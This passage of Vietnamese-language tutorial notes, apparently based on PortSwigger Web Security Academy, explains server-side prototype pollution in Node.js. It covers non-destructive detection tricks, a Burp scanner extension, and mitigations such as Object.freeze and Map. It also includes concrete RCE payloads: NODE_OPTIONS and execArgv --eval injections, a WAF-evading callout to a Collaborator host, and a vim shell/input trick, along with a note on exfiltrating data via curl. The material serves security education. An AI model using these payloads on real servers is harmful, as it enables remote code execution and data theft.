- Thiếu công cụ dành cho nhà phát triển - Vì JavaScript đang chạy trên hệ thống từ xa, bạn không thể kiểm tra các đối tượng khi chạy (inspect objects at runtime) như khi dùng DevTools của trình duyệt để kiểm tra DOM. Điều này khiến khó biết liệu bạn đã ô nhiễm prototype thành công hay chưa trừ khi hành vi của ứng dụng thay đổi rõ rệt. Hạn chế này hiển nhiên không áp dụng cho kiểm thử white-box.
- Vấn đề DoS - Việc ô nhiễm thành công các đối tượng trong môi trường phía máy chủ bằng những thuộc tính thực tế thường phá vỡ chức năng ứng dụng hoặc làm sập hoàn toàn server. Vì dễ vô tình gây ra denial-of-service (DoS), kiểm thử trên môi trường production có thể rất nguy hiểm. Ngay cả khi bạn xác định được lỗ hổng, phát triển nó thành exploit cũng khó khăn khi bạn về cơ bản đã làm hỏng trang trong quá trình thử nghiệm.
- Tính bền của ô nhiễm - Khi kiểm thử trong trình duyệt, bạn có thể hoàn tác mọi thay đổi và trả về môi trường sạch bằng cách đơn giản là refresh trang. Một khi bạn ô nhiễm prototype phía server, thay đổi này tồn tại trong toàn bộ vòng đời của tiến trình Node và bạn không có cách nào để đặt lại.

Trong các phần tiếp theo, chúng ta sẽ trình bày một số kỹ thuật không phá hủy cho phép bạn kiểm thử an toàn prototype pollution phía máy chủ bất chấp những hạn chế này.

---

## Phát hiện thông qua phản chiếu thuộc tính

---

Một cái bẫy dễ khiến nhà phát triển mắc phải là quên hoặc bỏ sót thực tế rằng vòng lặp `for...in` trong JavaScript sẽ lặp qua tất cả các thuộc tính có thể liệt kê (enumerable) của một đối tượng, bao gồm cả những thuộc tính nó kế thừa qua chuỗi prototype.

> **Lưu ý**
> 
> 
> Điều này không bao gồm các thuộc tính tích hợp do các constructor gốc của JavaScript đặt vì chúng theo mặc định là không thể liệt kê (non-enumerable).
> 

Bạn có thể tự kiểm thử điều này như sau:

```jsx
const myObject = { a: 1, b: 2 };

// ô nhiễm prototype với một thuộc tính tùy ý
Object.prototype.foo = 'bar';

// xác nhận myObject không có thuộc tính foo riêng (own property)
myObject.hasOwnProperty('foo'); // false

// liệt kê tên các thuộc tính của myObject
for(const propertyKey in myObject){
    console.log(propertyKey);
}

// Output: a, b, foo
```

Điều này cũng áp dụng với mảng, nơi một vòng `for...in` trước tiên lặp qua từng chỉ số (về bản chất là các khóa thuộc tính dạng số) trước khi chuyển sang bất kỳ thuộc tính được kế thừa nào.

```jsx
const myArray = ['a','b'];
Object.prototype.foo = 'bar';

for(const arrayKey in myArray){
    console.log(arrayKey);
}

// Output: 0, 1, foo
```

Trong cả hai trường hợp, nếu ứng dụng sau đó đưa các thuộc tính trả về này vào phản hồi (response), đây có thể là một cách đơn giản để dò tìm prototype pollution phía máy chủ.

Các yêu cầu `POST` hoặc `PUT` gửi dữ liệu JSON tới một ứng dụng hoặc API là những ứng viên hàng đầu cho hành vi kiểu này vì server thường trả về biểu diễn JSON của đối tượng mới hoặc đã được cập nhật. Trong trường hợp đó, bạn có thể cố gắng ô nhiễm `Object.prototype` với một thuộc tính tùy ý như sau:

```
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "foo":"bar"
    }
}
```

Nếu website dễ bị tấn công, thuộc tính bạn chèn sẽ xuất hiện trong đối tượng đã cập nhật trong phản hồi:

```
HTTP/1.1 200 OK
...
{
    "username":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "foo":"bar"
}
```

Trong những trường hợp hiếm hoi, website thậm chí có thể dùng những thuộc tính này để sinh HTML động, dẫn tới việc thuộc tính bị chèn được render trong trình duyệt của bạn.

Khi bạn xác định được rằng prototype pollution phía máy chủ là khả thi, bạn có thể tìm kiếm các gadget tiềm năng để sử dụng cho exploit. Bất kỳ chức năng nào liên quan tới cập nhật dữ liệu người dùng đều đáng để điều tra vì chúng thường liên quan tới việc gộp (merge) dữ liệu nhận vào vào một đối tượng hiện có đại diện cho người dùng trong ứng dụng. Nếu bạn có thể thêm các thuộc tính tùy ý vào chính user của mình, điều này có thể dẫn tới nhiều lỗ hổng, bao gồm leo thang đặc quyền (privilege escalation).

[Lab: Privilege escalation via server-side prototype pollution | Web Security Academy](https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution)

---

## Phát hiện khi không có phản chiếu thuộc tính

---

Hầu hết thời gian, ngay cả khi bạn đã ô nhiễm thành công một đối tượng prototype phía máy chủ, bạn sẽ không thấy thuộc tính bị ảnh hưởng được phản chiếu trong phản hồi. Vì bạn cũng không thể đơn giản kiểm tra đối tượng trong console, điều này tạo ra một thách thức khi cố gắng xác định liệu việc chèn của bạn có thành công hay không.

Một cách tiếp cận là thử chèn các thuộc tính khớp với các tùy chọn cấu hình có khả năng tồn tại trên server. Sau đó bạn so sánh hành vi của server trước và sau khi chèn để xem liệu thay đổi cấu hình này có vẻ đã có hiệu lực hay không. Nếu có, đây là một chỉ dấu mạnh cho thấy bạn đã tìm được lỗ hổng prototype pollution phía máy chủ.

Trong phần này, chúng ta sẽ xem xét các kỹ thuật sau:

- Ghi đè mã trạng thái (Status code override)
- Ghi đè khoảng trắng trong JSON (JSON spaces override)
- Ghi đè charset (Charset override)

Tất cả các chèn này đều không phá hủy, nhưng vẫn tạo ra một thay đổi hành vi của server rõ rệt và đặc trưng khi thành công. Bạn có thể dùng bất kỳ kỹ thuật nào được trình bày trong phần này để giải lab kèm theo.

Đây chỉ là một lựa chọn nhỏ trong số các kỹ thuật khả dĩ để giúp bạn hình dung những gì có thể làm được. Để biết chi tiết kỹ thuật hơn và cái nhìn sâu về cách PortSwigger Research phát triển các kỹ thuật này, hãy tham khảo bài whitepaper **Server-side prototype pollution: Black-box detection without the DoS** của Gareth Heyes.

---

### Status code

---

Các framework JavaScript phía máy chủ như Express cho phép nhà phát triển đặt mã trạng thái HTTP tùy chỉnh cho phản hồi. Trong trường hợp lỗi, một server JavaScript có thể trả về một phản hồi HTTP chung chung, nhưng kèm theo một đối tượng lỗi ở định dạng JSON trong thân (body). Đây là một cách để cung cấp thông tin chi tiết hơn về lý do xảy ra lỗi, điều mà mã trạng thái mặc định có thể không thể hiện rõ.

Mặc dù hơi gây hiểu lầm, nhưng khá phổ biến khi nhận được phản hồi `200 OK`, trong khi thân phản hồi lại chứa một đối tượng lỗi với một `status` khác:

```
HTTP/1.1 200 OK
...
{
    "error": {
        "success": false,
        "status": 401,
        "message": "You do not have permission to access this resource."
    }
}
```

Module `http-errors` của Node chứa hàm sau để tạo kiểu phản hồi lỗi như vậy:

```jsx
function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        status = err.status || err.statusCode || status
    } else if (type === 'number' && i === 0) {
    //...
    if (typeof status !== 'number' ||
    (!statuses.message[status] && (status < 400 || status >= 600))) {
        status = 500
    }
    //...
```

Dòng được bôi nổi đầu tiên cố gắng gán biến `status` bằng cách đọc thuộc tính `status` hoặc `statusCode` từ đối tượng được truyền vào hàm. Nếu nhà phát triển của website chưa đặt thuộc tính `status` cho lỗi một cách rõ ràng, bạn có thể dùng điều này để dò tìm prototype pollution như sau:

1. Tìm cách kích hoạt một phản hồi lỗi và ghi lại mã trạng thái mặc định.
2. Thử ô nhiễm prototype với thuộc tính `status` do bạn kiểm soát. Hãy sử dụng một mã trạng thái hiếm gặp để chắc chắn là ít có khả năng xuất hiện vì lý do khác.
3. Kích hoạt lại phản hồi lỗi và kiểm tra xem bạn có ghi đè được mã trạng thái hay không.

> **Lưu ý**
> 
> 
> Bạn phải chọn một mã trạng thái trong phạm vi 400–599. Nếu không, Node sẽ mặc định về 500 như đã thấy ở dòng được bôi nổi thứ hai, vì vậy bạn sẽ không biết được liệu prototype đã bị ô nhiễm hay chưa.
> 

---

### JSON Spaces

---

Framework Express cung cấp một tùy chọn `json spaces`, cho phép bạn cấu hình số lượng khoảng trắng được sử dụng để thụt lề bất kỳ dữ liệu JSON nào trong phản hồi. Trong nhiều trường hợp, các nhà phát triển để thuộc tính này ở trạng thái `undefined` vì họ chấp nhận giá trị mặc định, làm cho nó dễ bị ô nhiễm thông qua chuỗi prototype.

Nếu bạn có thể truy cập bất kỳ phản hồi JSON nào, bạn có thể thử ô nhiễm prototype với thuộc tính `json spaces` do bạn kiểm soát, rồi gửi lại request tương ứng để xem liệu khoảng cách thụt lề trong JSON có tăng lên tương ứng hay không. Bạn cũng có thể thực hiện các bước tương tự để xóa thụt lề nhằm xác nhận lỗ hổng.

Kỹ thuật này đặc biệt hữu ích vì nó không phụ thuộc vào một thuộc tính cụ thể được phản chiếu. Nó cũng cực kỳ an toàn vì về cơ bản bạn có thể bật/tắt ô nhiễm bằng cách đặt lại thuộc tính về cùng giá trị mặc định.

Mặc dù prototype pollution đã được sửa trong Express 4.17.4, các trang chưa nâng cấp vẫn có thể còn dễ bị tấn công.

> **Lưu ý**
> 
> 
> Khi thử kỹ thuật này trong Burp, hãy nhớ chuyển sang thẻ Raw của trình soạn tin nhắn. Nếu không, bạn sẽ không thấy thay đổi về thụt lề vì chế độ hiển thị đã được làm đẹp mặc định sẽ chuẩn hóa lại.
> 

---

### Charset

---

Các server Express thường triển khai các mô-đun "middleware" cho phép tiền xử lý (preprocessing) các yêu cầu trước khi chuyển cho hàm xử lý thích hợp. Ví dụ, mô-đun `body-parser` thường được dùng để phân tích thân (body) của các yêu cầu đến nhằm sinh ra một đối tượng `req.body`. Đây chứa một gadget khác mà bạn có thể dùng để dò tìm prototype pollution phía máy chủ.

Hãy chú ý rằng đoạn mã sau truyền một đối tượng options vào hàm `read()`, được dùng để đọc thân yêu cầu phục vụ việc phân tích. Một trong các tùy chọn này, `encoding`, quyết định mã ký tự (character encoding) sẽ được sử dụng. Giá trị này hoặc được lấy từ chính yêu cầu thông qua lời gọi `getCharset(req)`, hoặc mặc định là UTF-8.

```jsx
var charset = getCharset(req) or 'utf-8'

function getCharset (req) {
    try {
        return (contentType.parse(req).parameters.charset || '').toLowerCase()
    } catch (e) {
        return undefined
    }
}

read(req, res, next, parse, debug, {
    encoding: charset,
    inflate: inflate,
    limit: limit,
    verify: verify
})
```

Nếu nhìn kỹ hàm `getCharset()`, có vẻ như các nhà phát triển đã dự liệu rằng header `Content-Type` có thể không chứa thuộc tính `charset` rõ ràng, nên họ triển khai logic trả về chuỗi rỗng trong trường hợp đó. Điều then chốt là giá trị này có thể bị điều khiển thông qua prototype pollution.

Nếu bạn có thể tìm được một đối tượng có các thuộc tính được hiển thị trong phản hồi, bạn có thể dùng điều này để dò nguồn. Trong ví dụ sau, chúng ta sẽ dùng mã hóa UTF-7 và một nguồn JSON.

Thêm một chuỗi bất kỳ được mã hóa UTF-7 vào một thuộc tính được phản chiếu trong phản hồi. Ví dụ, `foo` trong UTF-7 là `+AGYAbwBv-`.

```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"+AGYAbwBv-"
}
```

Gửi yêu cầu. Server thường không dùng mã hóa UTF-7 theo mặc định, vì vậy chuỗi này nên xuất hiện trong phản hồi ở dạng đã mã hóa.

Thử ô nhiễm prototype với một thuộc tính `content-type` chỉ định rõ bộ ký tự UTF-7:

```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}
```

Lặp lại yêu cầu đầu tiên. Nếu bạn ô nhiễm prototype thành công, chuỗi UTF-7 bây giờ sẽ được giải mã trong phản hồi:

```json
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"foo"
}
```

Do một lỗi trong module `_http_incoming` của Node, điều này hoạt động ngay cả khi header `Content-Type` thực tế của yêu cầu chứa thuộc tính `charset` riêng của nó. Để tránh ghi đè các thuộc tính khi một yêu cầu chứa các header trùng lặp, hàm `_addHeaderLine()` kiểm tra rằng không có thuộc tính nào đã tồn tại với cùng khóa trước khi chuyển các thuộc tính sang đối tượng `IncomingMessage`:

```jsx
IncomingMessage.prototype._addHeaderLine = _addHeaderLine;
function _addHeaderLine(field, value, dest) {
    // ...
    } else if (dest[field] === undefined) {
        // Drop duplicates
        dest[field] = value;
    }
}
```

Nếu tồn tại, header đang được xử lý sẽ thực chất bị loại bỏ. Do cách triển khai này, kiểm tra (có lẽ là vô tình) bao gồm cả các thuộc tính được kế thừa qua chuỗi prototype. Điều này nghĩa là nếu chúng ta ô nhiễm prototype với thuộc tính `content-type` của riêng mình, thuộc tính đại diện cho header `Content-Type` thực tế từ yêu cầu sẽ bị loại bỏ tại điểm này, cùng với giá trị dự kiến được lấy từ header.

[Lab: Detecting server-side prototype pollution without polluted property reflection | Web Security Academy](https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection)

---

## Scanning for Sources

---

Mặc dù việc thử dò nguồn thủ công hữu ích để củng cố hiểu biết về lỗ hổng, nhưng trong thực tế điều này có thể lặp đi lặp lại và tốn thời gian. Vì lý do này, chúng tôi đã tạo **tiện ích mở rộng Server-Side Prototype Pollution Scanner** cho Burp Suite, cho phép bạn tự động hóa quy trình này. Luồng công việc cơ bản như sau:

1. Cài đặt tiện ích mở rộng **Server-Side Prototype Pollution Scanner** từ **BApp Store** và đảm bảo rằng tiện ích đã được kích hoạt. Để biết chi tiết cách thực hiện, xem phần *Installing extensions from the BApp Store*.
2. Duyệt (explore) trang web mục tiêu bằng trình duyệt của Burp để lập bản đồ càng nhiều nội dung càng tốt và tích lũy lưu lượng (traffic) vào lịch sử proxy.
3. Trong Burp, vào tab **Proxy > HTTP history**.
4. Lọc danh sách để chỉ hiển thị các mục nằm trong phạm vi (in-scope).
5. Chọn tất cả các mục trong danh sách.
6. Nhấp phải vào lựa chọn và đi tới **Extensions > Server-Side Prototype Pollution Scanner > Server-Side Prototype Pollution**, rồi chọn một trong các kỹ thuật quét trong danh sách.
7. Khi được nhắc, chỉnh cấu hình tấn công nếu cần, rồi bấm **OK** để khởi chạy quét.

Trong Burp Suite Professional, tiện ích sẽ báo cáo bất kỳ nguồn prototype pollution phía máy chủ nào nó tìm thấy thông qua bảng **Issue activity** trên các tab **Dashboard** và **Target**. Nếu bạn đang dùng Burp Suite Community Edition, bạn cần vào **Extensions > Installed**, chọn tiện ích, sau đó theo dõi tab **Output** của tiện ích để xem các vấn đề được báo cáo.

> **Lưu ý**
> 
> 
> Nếu bạn không chắc nên dùng kỹ thuật quét nào, bạn cũng có thể chọn **Full scan** để chạy quét bằng tất cả các kỹ thuật sẵn có. Tuy nhiên, điều này sẽ gửi số lượng lớn yêu cầu hơn đáng kể.
> 

---

## Bypass input filter

---

Các trang web thường cố gắng ngăn chặn hoặc vá các lỗ hổng prototype pollution bằng cách lọc các khóa đáng ngờ như `__proto__`. Cách tiếp cận lọc khóa này không phải là giải pháp bền vững vì tồn tại nhiều cách có thể bị qua mặt. Ví dụ, kẻ tấn công có thể:

- Che mờ (obfuscate) các từ khóa bị cấm để chúng không bị phát hiện trong quá trình lọc. Để biết thêm, xem **Bypassing flawed key sanitization**.
- Truy cập prototype thông qua thuộc tính `constructor` thay vì dùng `__proto__`. Để biết thêm, xem **Prototype pollution via the constructor**.
- Các ứng dụng Node cũng có thể xóa hoặc vô hiệu hoá `__proto__` hoàn toàn bằng các cờ dòng lệnh `-disable-proto=delete` hoặc `-disable-proto=throw` tương ứng. Tuy nhiên, điều này vẫn có thể bị qua mặt bằng kỹ thuật sử dụng `constructor`.

[Lab: Bypassing flawed input filters for server-side prototype pollution | Web Security Academy](https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution)

---

## RCE

---

Trong khi prototype pollution phía client thường khiến trang web bị DOM XSS, prototype pollution phía server có khả năng dẫn tới thực thi mã từ xa (RCE). Trong phần này, bạn sẽ học cách xác định những trường hợp có thể xảy ra điều đó và cách khai thác một số vector tiềm năng trong các ứng dụng Node.

---

### Yêu cầu kém bảo mật

---

Có một số điểm có thể dẫn đến thực thi lệnh trong Node, nhiều nhất là xuất hiện trong module `child_process`. Chúng thường được gọi bởi một yêu cầu xảy ra bất đồng bộ so với yêu cầu mà bạn đã có thể ô nhiễm prototype trước đó. Do đó, cách tốt nhất để xác định những yêu cầu này là ô nhiễm prototype với một payload sao cho khi payload được gọi sẽ tạo tương tác với Burp Collaborator.

Biến môi trường `NODE_OPTIONS` cho phép bạn định nghĩa một chuỗi các tham số dòng lệnh sẽ được dùng mặc định khi khởi tạo một tiến trình Node mới. Vì đây cũng là một thuộc tính trên đối tượng `env`, bạn có thể kiểm soát nó thông qua prototype pollution nếu `env` không định nghĩa thuộc tính đó.

Một số hàm của Node để tạo tiến trình con (child process) chấp nhận một thuộc tính tùy chọn `shell`, cho phép nhà phát triển đặt một shell cụ thể, như `bash`, để chạy lệnh. Khi kết hợp điều này với một thuộc tính `NODE_OPTIONS` độc hại, bạn có thể ô nhiễm prototype theo cách khiến mỗi khi một tiến trình Node mới được tạo sẽ gây ra một tương tác tới Burp Collaborator:

```json
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```

Bằng cách này, bạn có thể dễ dàng nhận biết khi một yêu cầu tạo một tiến trình con mới có các đối số dòng lệnh có thể bị điều khiển thông qua prototype pollution.

> **Mẹo**
> 
> 
> Các dấu ngoặc kép đã escape trong hostname không nhất thiết là cần thiết. Tuy nhiên, chúng có thể giúp giảm số cảnh báo dương giả bằng cách che mờ hostname để né các WAF và hệ thống khác quét tìm hostname.
> 

---

### **child_process.fork()**

---

Các phương thức như `child_process.spawn()` và `child_process.fork()` cho phép nhà phát triển tạo các tiến trình con Node mới. Phương thức `fork()` nhận một đối tượng `options` trong đó một trong các tùy chọn có thể là `execArgv`. Đây là một mảng các chuỗi chứa các tham số dòng lệnh sẽ được dùng khi sinh tiến trình con. Nếu nhà phát triển để `execArgv` là `undefined`, điều này có thể đồng nghĩa với việc nó có thể bị điều khiển thông qua prototype pollution.

Vì gadget này cho phép bạn trực tiếp điều khiển các tham số dòng lệnh, nó mở ra các vector tấn công mà không thể thực hiện được chỉ với `NODE_OPTIONS`. Một tham số đặc biệt đáng chú ý là `--eval`, cho phép bạn truyền vào JavaScript tùy ý sẽ được tiến trình con thực thi. Điều này rất mạnh, thậm chí cho phép bạn nạp thêm các module vào môi trường:

```jsx
"execArgv": [
    "--eval=require('<module>')"
]
```

Bên cạnh `fork()`, module `child_process` còn có phương thức `execSync()`, phương thức này thực thi một chuỗi tùy ý như một lệnh hệ thống. Bằng cách xâu chuỗi các sink tiêm JavaScript và tiêm lệnh hệ thống này, bạn có thể nâng cấp prototype pollution để đạt được khả năng RCE đầy đủ trên server.

[Lab: Remote code execution via server-side prototype pollution | Web Security Academy](https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution)

---

### **child_process.execSync()**

---

Trong ví dụ trước, chúng ta đã tự chèn sink `child_process.execSync()` thông qua đối số dòng lệnh `--eval`. Trong một số trường hợp, ứng dụng có thể tự gọi phương thức này để thực thi các lệnh hệ thống.

Tương tự như `fork()`, phương thức `execSync()` cũng nhận một đối tượng options, và đối tượng này có thể bị ô nhiễm thông qua chuỗi prototype. Mặc dù nó không chấp nhận thuộc tính `execArgv`, bạn vẫn có thể chèn lệnh hệ thống vào một tiến trình con đang chạy bằng cách cùng lúc ô nhiễm cả hai thuộc tính `shell` và `input`:

- Tùy chọn `input` chỉ là một chuỗi được truyền vào luồng `stdin` của tiến trình con và được `execSync()` thực thi như một lệnh hệ thống. Vì còn có các cách khác để cung cấp lệnh (ví dụ truyền trực tiếp làm tham số hàm), thuộc tính `input` có thể bị để undefined.
- Tùy chọn `shell` cho phép nhà phát triển khai báo một shell cụ thể để chạy lệnh. Mặc định, `execSync()` sử dụng shell hệ thống, nên tùy chọn này cũng có thể bị để undefined.

Bằng cách ô nhiễm cả hai thuộc tính này, bạn có thể ghi đè lệnh mà nhà phát triển định chạy và thay vào đó chạy một lệnh độc hại trong shell bạn chọn. Lưu ý một vài điểm hạn chế:

- Thuộc tính `shell` chỉ chấp nhận tên thực thi của shell và không cho phép bạn đặt thêm đối số dòng lệnh.
- Shell luôn được thực thi với đối số `c`, mà hầu hết shell dùng để cho phép truyền lệnh dưới dạng chuỗi. Tuy nhiên, khi đặt cờ `c` trong Node sẽ chạy kiểm tra cú pháp trên script được cung cấp, và điều này cũng ngăn script chạy. Do đó, mặc dù có một số biện pháp khắc phục, nói chung khá khó để dùng chính Node làm shell cho cuộc tấn công của bạn.
- Vì thuộc tính `input` chứa payload được truyền qua `stdin`, shell bạn chọn phải chấp nhận lệnh từ `stdin`.

Mặc dù không thực sự được thiết kế như shell, trình soạn thảo văn bản `vim` và `ex` thoả mãn các tiêu chí này một cách đáng tin cậy. Nếu một trong hai được cài đặt trên server, đây tạo ra một vector tiềm năng cho RCE:

```json
"shell":"vim",
"input":":! <command>\n"
```

> **Lưu ý**
> 
> 
> Vim có một prompt tương tác và mong người dùng nhấn Enter để chạy lệnh đã cung cấp. Do đó, bạn cần mô phỏng thao tác này bằng cách thêm ký tự xuống dòng (`\n`) ở cuối payload, như ví dụ trên.
> 

Một hạn chế bổ sung của kỹ thuật này là một số công cụ bạn muốn dùng cho exploit cũng không đọc dữ liệu từ `stdin` theo mặc định. Tuy nhiên, có vài cách đơn giản để khắc phục điều này. Với `curl`, ví dụ, bạn có thể đọc `stdin` và gửi nội dung đó làm body của một POST bằng đối số `-d @-`.

Trong các trường hợp khác, bạn có thể dùng `xargs`, công cụ này chuyển `stdin` thành danh sách đối số và truyền cho một lệnh.

[Lab: Exfiltrating sensitive data via server-side prototype pollution | Web Security Academy](https://portswigger.net/web-security/prototype-pollution/server-side/lab-exfiltrating-sensitive-data-via-server-side-prototype-pollution)

---

# Bảo mật

---

Chúng tôi khuyến nghị vá mọi lỗ hổng prototype pollution mà bạn phát hiện trên các website của mình, bất kể chúng đã kết hợp với các gadget có thể khai thác hay chưa. Ngay cả khi bạn tự tin rằng không bỏ sót gì, cũng không có gì đảm bảo rằng các bản cập nhật trong tương lai của chính mã nguồn bạn hoặc các thư viện bên thứ ba mà bạn dùng sẽ không vô tình giới thiệu các gadget mới — và từ đó mở đường cho exploit khả thi.

Trong phần này, chúng tôi đưa ra một số lời khuyên ở mức cao về những biện pháp bạn có thể áp dụng để bảo vệ website khỏi các mối đe dọa đã trình bày trong các lab. Đồng thời nêu những lỗi phổ biến cần tránh.

---

## Lọc khóa thuộc tính

---

Một trong những cách rõ ràng để ngăn prototype pollution là lọc (sanitize) các khóa thuộc tính trước khi gộp (merge) chúng vào các đối tượng hiện có. Bằng cách này bạn có thể ngăn kẻ tấn công chèn các khóa như `__proto__`, vốn tham chiếu tới prototype của đối tượng.

Sử dụng **danh sách cho phép** (allowlist) các khóa được phép là cách hiệu quả nhất. Tuy nhiên, vì điều này không khả thi trong nhiều trường hợp, người ta thường dùng **danh sách chặn** (blocklist) thay thế, loại bỏ các chuỗi có thể gây nguy hại khỏi đầu vào của người dùng.

Mặc dù đây là bản vá nhanh dễ triển khai, việc blocklisting thực sự bền vững vốn rất khó vì những hạn chế đã thấy ở nhiều trang: họ chặn `__proto__` thành công nhưng lại bỏ sót trường hợp kẻ tấn công truy cập prototype thông qua `constructor`. Cài đặt yếu cũng có thể bị vượt qua bằng các kỹ thuật obfuscation đơn giản. Vì vậy, chúng tôi chỉ khuyến nghị coi đây là giải pháp tạm thời (stopgap) chứ không phải giải pháp dài hạn.

---

## **Ngăn chặn thay đổi đối với các prototype object**

---

Một cách tiếp cận vững chắc hơn để ngăn prototype pollution là ngăn không cho các đối tượng prototype bị thay đổi.

Gọi `Object.freeze()` trên một đối tượng đảm bảo rằng các thuộc tính của nó và giá trị của chúng không thể bị sửa đổi nữa, và không thể thêm thuộc tính mới. Vì prototype bản chất cũng là các đối tượng, bạn có thể dùng phương pháp này để chủ động bịt mọi nguồn tiềm năng:

```jsx
Object.freeze(Object.prototype);
```

`Object.seal()` là cách khác tương tự, nhưng vẫn cho phép thay đổi giá trị của các thuộc tính hiện có. Đây có thể là một thỏa hiệp hợp lý nếu bạn không thể dùng `Object.freeze()` vì lý do nào đó.

---

## **Ngăn một đối tượng kế thừa thuộc tính**

---

Bên cạnh việc dùng `Object.freeze()` để chặn các nguồn prototype pollution, bạn cũng có thể loại bỏ gadget bằng cách tạo các đối tượng không kế thừa từ `Object.prototype`. Như vậy, ngay cả khi kẻ tấn công có ô nhiễm prototype, khả năng khai thác sẽ bị hạn chế.

Mặc định, tất cả đối tượng kế thừa từ `Object.prototype` trực tiếp hoặc gián tiếp. Tuy nhiên, bạn có thể tạo đối tượng bằng `Object.create()` và chỉ định prototype thủ công — thậm chí có thể tạo đối tượng với prototype là `null`, đảm bảo nó sẽ không kế thừa bất kỳ thuộc tính nào:

```jsx
let myObject = Object.create(null);
Object.getPrototypeOf(myObject);    // null
```

---

## **Dùng các lựa chọn an toàn hơn khi có thể**

---

Một biện pháp phòng vệ vững chắc khác là sử dụng các cấu trúc dữ liệu có bảo vệ tích hợp. Ví dụ, khi định nghĩa một đối tượng `options`, bạn có thể dùng `Map` thay vì object thuần. Mặc dù một `Map` vẫn có thể "kế thừa" thuộc tính độc hại nếu ai đó chồng thuộc tính lên prototype, nhưng `Map` có phương thức `get()` chỉ trả về các khóa được định nghĩa trực tiếp trên map đó:

```jsx
Object.prototype.evil = 'polluted';
let options = new Map();
options.set('transport_url', 'https://normal-website.com');

options.evil;                    // 'polluted'
options.get('evil');             // undefined
options.get('transport_url');    // 'https://normal-website.com'
```

`Set` là một lựa chọn khác nếu bạn chỉ lưu giá trị (value) chứ không cần cặp key:value. Giống như `Map`, `Set` cung cấp các phương thức tích hợp chỉ trả về dữ liệu định nghĩa trực tiếp trên chính đối tượng đó:

```jsx
Object.prototype.evil = 'polluted';
let options = new Set();
options.add('safe');

options.evil;           // 'polluted';
options.has('evil');    // false
options.has('safe');    // true
```
